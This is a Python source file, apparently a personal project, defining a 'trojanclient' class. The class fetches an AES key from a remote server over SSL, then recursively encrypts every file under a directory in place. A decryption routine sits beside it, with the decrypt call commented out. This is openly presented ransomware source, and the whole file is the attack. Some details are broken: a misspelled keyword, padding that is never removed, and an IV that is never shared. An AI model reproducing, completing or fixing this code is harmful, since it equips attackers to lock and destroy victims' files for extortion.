import os
import socket
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher ,algorithms ,modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding


class trojanclient():
    def __init__(self, random_key) -> None:
        self.key = random_key
        self.iv = os.urandom(16)
        self.backend = default_backend()


    def it_direction(self, dirpath, actionfunc):
        for dirpath, dirnames , filenames in os.walk(dirpath):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                actionfunc(filepath)
                

    def encrypt_file(self,path):
        plaintext = self.read_file(path)
        encrypted_text = self.enc_payload(plaintext)
        self.write_file(path,encrypted_text)


    def decrypt_file(self, path):
        encrypted_text = self.read_file(path)
        plaintext = self.decrypt_cipher(encrypted_text)
        self.write_file(path, plaintext)


    def read_file(self, path):
        with open (path, "rb") as file:
            plaintext = file.read()
            return plaintext
    

    def write_file(self, path, data):
        with open(path, "wb") as encrypted_file:
            encrypted_file.write(data)


    def enc_payload(self, plaintext):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), beckend=self.backend)
        encryptor = cipher.encryptor()
        padded_payload = plaintext + b" " *(16-len(plaintext)%16)
        ciphertext = encryptor.update(padded_payload) + encryptor.finalize()

        return ciphertext
    

    def decrypt_cipher(self,encrypted_text):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), beckend=self.backend)
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(encrypted_text) + decryptor.finalize()

        return plaintext

        


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(sock)
    ssl_sock.connect(("127.0.0.1",8080)) #instead of 127.0.0.1 you need to put your servers ip
    random_key = ssl_sock.recv(1024)
    trojan = trojanclient(random_key)
    trojan.it_direction("C:/Users/idan shema/Desktop/projects/test/", actionfunc=trojan.encrypt_file)
    # trojan.it_direction("C:/Users/idan shema/Desktop/projects/test/", actionfunc=trojan.decrypt_file)
    